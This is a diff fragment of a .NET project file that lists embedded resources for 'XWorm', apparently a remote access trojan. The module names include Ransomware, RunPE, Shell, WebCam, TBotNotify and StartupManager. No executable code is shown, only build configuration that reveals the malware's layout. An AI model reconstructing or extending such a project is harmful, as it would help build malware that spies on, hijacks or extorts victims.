+    <EmbeddedResource Update="XWorm.Programs.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Programs.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Proxy.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Proxy.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Ransomware.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Ransomware.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Registry.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Registry.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Resources.resx">
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Resources.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.RunPE.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.RunPE.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ServiceManager.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ServiceManager.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Shell.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Shell.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.Sound.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.Sound.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.StartupManager.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.StartupManager.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TBotNotify.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.TBotNotify.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TcpConnectionForm.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.TcpConnectionForm.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.ToolsBox.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.ToolsBox.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.TXT.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace></CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+    </EmbeddedResource>
+    <EmbeddedResource Update="XWorm.WebCam.resx">
+      <CopyToOutputDirectory>Never</CopyToOutputDirectory>
+      <CustomToolNamespace>ResXFileCodeGenerator</CustomToolNamespace>
+      <Generator>ResXFileCodeGenerator</Generator>
+      <LastGenOutput>XWorm.WebCam.Designer.cs</LastGenOutput>
+    </EmbeddedResource>
+  </ItemGroup>
+</Project>
